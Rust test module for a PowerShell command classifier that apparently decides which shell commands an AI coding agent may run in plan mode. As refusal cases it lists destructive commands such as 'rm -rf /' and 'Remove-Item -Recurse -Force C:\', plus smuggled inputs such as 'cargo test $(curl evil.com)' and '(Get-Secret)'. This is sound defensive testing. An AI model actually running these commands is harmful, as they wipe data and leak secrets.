    /// The exact shape that was denied in the field (plan mode, Windows):
    /// a read-only exploration pipeline using shapers, script blocks over
    /// `$_`, groupings, and `if (Test-Path ...)` statements.
    #[test]
    fn observed_exploration_pipeline_is_read_only() {
        let cmd = "Get-ChildItem -Recurse -File | Select-Object -First 100 | \
                   ForEach-Object { $_.FullName.Replace((Get-Location).Path + '\\','') } ; \
                   Write-Host \"---\"; \
                   if (Test-Path \"pyproject.toml\") { Get-Content pyproject.toml | head -100 } ; \
                   if (Test-Path \"requirements.txt\") { Get-Content requirements.txt } ; \
                   if (Test-Path \"package.json\") { Get-Content package.json }";
        assert_eq!(classify(cmd), RiskClass::ReadOnly);
    }

    #[test]
    fn pipeline_shapers_and_aliases_are_read_only() {
        for cmd in [
            "Get-ChildItem | Select-Object -First 5",
            "gci | ? { $_.Length -gt 5 } | select Name -First 3 | sort Name | measure",
            "1..10 | % { $_ * 2 }",
            "Get-Process | Sort-Object CPU -Descending | Format-Table -AutoSize",
            "Get-Content x.txt | Measure-Object -Line",
            "Get-ChildItem | Group-Object Extension",
            "Where-Object FullName -match 'src'",
            "GET-CHILDITEM | SELECT-OBJECT -FIRST 3",
            "foreach ($f in Get-ChildItem) { $f.Name }",
            "if (Test-Path 'x') { Get-Content 'x' } else { Write-Output 'missing' }",
            "try { Get-Content x } catch { Write-Host $_ }",
            "$x = Get-ChildItem; $x | Measure-Object",
            "$env:FOO = 'bar'; Get-ChildItem",
            "[math]::Round(1.5)",
            "$_.FullName.Replace('a','b')",
            "Get-Content x > $null",
            "Get-Content x 2>$null",
            "Get-Content x 2>&1",
            "git status",
            "ls | head -5",
            "<# a note #> Get-Date",
            "Get-Content x # trailing comment",
        ] {
            assert_eq!(
                classify(cmd),
                RiskClass::ReadOnly,
                "expected ReadOnly: {cmd}"
            );
        }
    }

    /// Matched pairs for the shapes above: the same constructs carrying a
    /// mutation must keep refusing — the allowance is the block recursion,
    /// not the cmdlet name.
    #[test]
    fn mutations_inside_recursed_regions_still_refuse() {
        for cmd in [
            "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
            "gci | % { Set-Content $_ 'x' }",
            "Select-Object @{n='x';e={ Set-Content f 1 }}",
            "if (Test-Path x) { New-Item y }",
            "foreach ($f in Remove-Item x) { $f }",
            "$x = Remove-Item f",
            "1..3 | ForEach-Object { mkdir \"d$_\" }",
            "try { Remove-Item x } catch { Write-Host 'oops' }",
        ] {
            assert_ne!(
                classify(cmd),
                RiskClass::ReadOnly,
                "must not be ReadOnly: {cmd}"
            );
        }
    }

    #[test]
    fn writes_and_launchers_classify_at_least_mutation() {
        for cmd in [
            "Set-Content f 'x'",
            "Out-File -FilePath f -InputObject 'x'",
            "Add-Content f 'x'",
            "New-Item -ItemType Directory d",
            "Move-Item a b",
            "Copy-Item a b",
            "Get-Content x > out.txt",
            "Get-Content x *> out.txt",
            "Get-Content x 2> err.txt",
            "echo hi>f.txt",
            "Get-Content x > '$null'",
            "Get-Content x >",
            "Tee-Object -FilePath f",
            "& $someCommand",
            "& 'C:\\tools\\thing.exe'",
            ". .\\profile.ps1",
            "[IO.File]::Delete('x')",
            "[System.Diagnostics.Process]::Start('calc')",
            "$p.Kill()",
            "$f.Delete()",
            "touch f",
        ] {
            assert_ne!(
                classify(cmd),
                RiskClass::ReadOnly,
                "must not be ReadOnly: {cmd}"
            );
        }
    }

    #[test]
    fn network_and_process_heads_keep_their_class() {
        assert_eq!(classify("Invoke-WebRequest https://x"), RiskClass::Network);
        assert_eq!(classify("iwr https://x"), RiskClass::Network);
        assert_eq!(classify("git push origin main"), RiskClass::Network);
        assert_eq!(classify("Start-Process notepad"), RiskClass::Process);
        assert_eq!(classify("Invoke-Expression $p"), RiskClass::Process);
        assert_eq!(classify("cargo test"), RiskClass::Process);
        // A benign outer pipeline cannot mask a network segment in a block.
        assert_eq!(
            classify("ForEach-Object { Invoke-WebRequest $_ }"),
            RiskClass::Network
        );
    }

    #[test]
    fn destructive_patterns_hard_deny_in_this_dialect_too() {
        for cmd in [
            "Remove-Item -Recurse -Force C:\\",
            "rm -rf /",
            "pwsh -Command \"rm -rf /\"",
        ] {
            assert_eq!(classify(cmd), RiskClass::Destructive, "cmd: {cmd}");
        }
    }

    #[test]
    fn here_strings_are_data_but_interpolations_classify() {
        assert_eq!(classify("@\"\nhello $(Get-Date)\n\"@"), RiskClass::ReadOnly);
        assert_ne!(classify("@\"\n$(Remove-Item x)\n\"@"), RiskClass::ReadOnly);
        // Literal here-string: the body never executes, even if it quotes a
        // mutating command.
        assert_eq!(
            classify("@'\n$(New-Item y)\nplain prose\n'@"),
            RiskClass::ReadOnly
        );
        // Unterminated: everything after is unprovable.
        assert_ne!(classify("@\"\nno terminator"), RiskClass::ReadOnly);
        // An inline `@\"` is not a here-string; the quotes pair up as plain
        // strings and the trailing command still classifies.
        assert_ne!(
            classify("@\" a \" b \"@; Remove-Item x"),
            RiskClass::ReadOnly
        );
    }

    #[test]
    fn structural_breakage_fails_closed() {
        for cmd in [
            "Get-ChildItem | ForEach-Object { $_.Name",
            "Get-ChildItem )",
            "'unterminated",
        ] {
            assert_ne!(classify(cmd), RiskClass::ReadOnly, "cmd: {cmd}");
        }
        // Depth bomb: nesting past the cap floors instead of recursing.
        let nested = format!("{}Get-Date{}", "$( ".repeat(12), " )".repeat(12));
        assert_ne!(classify(&nested), RiskClass::ReadOnly);
    }

    #[test]
    fn expression_statements_and_operators_are_read_only() {
        for cmd in [
            "$x",
            "$x.Length -gt 100",
            "$x = 10 % 3",
            "1..100",
            "-not $flag",
            "'literal text'",
            "\"interpolated $name\"",
        ] {
            assert_eq!(classify(cmd), RiskClass::ReadOnly, "cmd: {cmd}");
        }
    }

    #[test]
    fn plan_safe_build_ps_allows_known_invocations() {
        for cmd in [
            "cargo check",
            "cargo build --release",
            "cargo test policy -- --nocapture",
            "cargo nextest run",
            "npm test",
            "npm run build",
            "make test",
            // Compounds where every statement is a read or a safe build,
            // including the PowerShell discard spelling.
            "cd crates/mermaid-runtime; cargo test",
            "cargo check && cargo test",
            "cargo test 2>$null",
            "cargo test | select -First 40",
        ] {
            assert!(is_plan_safe_build_command_ps(cmd), "should allow: {cmd}");
        }
    }

    #[test]
    fn plan_safe_build_ps_refuses_mutations_and_unprovable_structure() {
        for cmd in [
            "",
            "cargo run",
            "cargo install ripgrep",
            "cargo fmt",
            "npm install",
            "make deploy",
            "cargo test && rm -rf target",
            // Anchoring: a region could run anything.
            "cargo test $(curl evil.com)",
            "cargo test (Get-Secret)",
            // File-writing redirect — including the unix discard spelling,
            // which is a REAL path under PowerShell.
            "cargo test > src/lib.rs",
            "cargo test 2>/dev/null",
            // Call operator / argv-target writers.
            "& cargo test",
            "cargo test | Tee-Object -FilePath log.txt",
        ] {
            assert!(!is_plan_safe_build_command_ps(cmd), "should refuse: {cmd}");
        }
    }

    fn plan_write_ps(cmd: &str) -> bool {
        is_plan_file_only_write_ps(
            cmd,
            Path::new("/repo"),
            Path::new("/repo/.mermaid/plans/x.md"),
        )
    }

    #[test]
    fn plan_file_only_write_ps_allows_the_authoring_shapes() {
        for cmd in [
            "echo x > .mermaid/plans/x.md",
            "echo x > /repo/.mermaid/plans/x.md",
            "Write-Output '# Plan' > .mermaid/plans/x.md",
            "echo more >> .mermaid/plans/x.md",
            "echo x >.mermaid/plans/x.md",
            // Quoted `>` is data; the real redirect still targets the plan.
            "echo 'a > b' > .mermaid/plans/x.md",
        ] {
            assert!(plan_write_ps(cmd), "must allow: {cmd}");
        }
        // The PowerShell payoff: backslash spellings the POSIX tokenizer
        // mangles, quoted or bare. `Path` treats `\` as a separator only on
        // Windows, so these assert where the dispatcher actually runs them.
        if cfg!(target_os = "windows") {
            for cmd in [
                "echo x > .mermaid\\plans\\x.md",
                "echo x > '.mermaid\\plans\\x.md'",
            ] {
                assert!(plan_write_ps(cmd), "must allow: {cmd}");
            }
        }
    }

    #[test]
    fn plan_file_only_write_ps_refuses_everything_else() {
        for cmd in [
            "echo x > src/main.rs",
            "echo x > other.md",
            "echo x > $PLAN",
            "echo x > .mermaid/plans/../../src/main.rs",
            "echo x > .mermaid/plans/x.md; git push",
            "echo x > .mermaid/plans/x.md && Remove-Item src -Recurse",
            // A cwd change relocates the lexical match.
            "Set-Location /tmp; echo x > .mermaid/plans/x.md",
            "sl /tmp; echo x > .mermaid/plans/x.md",
            // Regions and here-strings are unprovable here.
            "echo $(Get-Date) > .mermaid/plans/x.md",
            "@\"\nbody\n\"@ > .mermaid/plans/x.md",
            // Argv-target writers and the call operator.
            "tee .mermaid/plans/x.md",
            "Out-File .mermaid/plans/x.md",
            "& echo x > .mermaid/plans/x.md",
            // Word-glued operator keeps content and target fused: refuse.
            "echo hi>.mermaid/plans/x.md && git push",
            // No plan redirect at all.
            "Get-Content src/main.rs",
            "",
        ] {
            assert!(!plan_write_ps(cmd), "must refuse: {cmd}");
        }
    }

    /// `--%` stops PowerShell's parsing, so a `>` after it is NOT a redirect
    /// — which is why the token scan stops there. Verified against pwsh
    /// 7.6.4 rather than assumed: `Write-Output hello --% > out.txt` prints
    /// `hello`, `--%`, `> out.txt` and creates no file.
    ///
    /// The residual case is a native command that redirects on its OWN
    /// behalf (`cmd /c echo hi --% > f` really does write `f`, via cmd's
    /// shell). That is safe here for a structural reason worth pinning: every
    /// such head — `cmd`, `sh`, `bash`, `pwsh` — is either unknown
    /// (`ShellMutation`) or in `PROCESS_BINARIES`, so none can reach
    /// `ReadOnly` no matter what follows the stop-parse token.
    #[test]
    fn stop_parsing_token_cannot_hide_a_write_behind_a_read_only_head() {
        assert_eq!(
            classify("Write-Output hello --% > out.txt"),
            RiskClass::ReadOnly
        );
        for cmd in [
            "cmd /c echo hi --% > out.txt",
            "sh -c 'echo hi' --% > out.txt",
            "pwsh -c echo --% > out.txt",
        ] {
            assert_ne!(classify(cmd), RiskClass::ReadOnly, "cmd: {cmd}");
        }
    }

    /// The safe-target rule is the `$null` device only — and only unquoted.
    #[test]
    fn null_device_matrix() {
        assert_eq!(classify("Get-Content x > $null"), RiskClass::ReadOnly);
        assert_eq!(classify("Get-Content x >> $null"), RiskClass::ReadOnly);
        assert_eq!(classify("Get-Content x *> $null"), RiskClass::ReadOnly);
        assert_eq!(classify("Get-Content x | Out-Null"), RiskClass::ReadOnly);
        assert_ne!(classify("Get-Content x > null.txt"), RiskClass::ReadOnly);
        assert_ne!(classify("Get-Content x > \"$null\""), RiskClass::ReadOnly);
        // The unix discard spelling is the dangerous one, and it is worse
        // than "a relative file": pwsh 7.6.4 resolves `2>/dev/null` to
        // `Out-File` at `C:\dev\null` — DRIVE-ABSOLUTE, so it writes outside
        // the project. The POSIX classifier rated all three `ReadOnly`.
        for cmd in [
            "Get-Content x 2>/dev/null",
            "Get-Content x >/dev/null",
            "Get-Content x &>/dev/null",
        ] {
            assert_ne!(classify(cmd), RiskClass::ReadOnly, "cmd: {cmd}");
        }
    }
}
